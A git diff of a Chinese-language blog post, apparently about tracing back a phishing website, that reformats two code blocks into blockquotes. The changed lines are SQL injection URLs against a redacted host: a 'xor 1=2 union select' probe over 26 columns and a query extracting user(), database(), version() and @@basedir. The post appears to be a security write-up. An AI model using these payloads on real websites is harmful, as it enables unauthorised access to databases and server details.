@@ -50,8 +50,8 @@ permalink: /archivers/Traceability-go-fishing-website-20180714
 
 ### 1.5 联合查询语句，暴出可显示字段
 
-<pre><code>http://www.xxxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,
-14,15,16,17,18,19,20,21,22,23,24,25,26</pre></code>
+>http://www.xxxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,
+>14,15,16,17,18,19,20,21,22,23,24,25,26
 
 ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714111522.png)
 
@@ -77,7 +77,8 @@ permalink: /archivers/Traceability-go-fishing-website-20180714
 >
 >@@version_compile_os 操作系统 
 
-<pre><code>http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,user(),database(),7,8,version(),10,11,12,@@basedir,14,15,16,17,18,19,20,21,22,23,24,25,26</pre></code>
+>http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,user(),database(),7,8,version(),10,11,12,
+>@@basedir,14,15,16,17,18,19,20,21,22,23,24,25,26
 
 ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714122723.png)
 
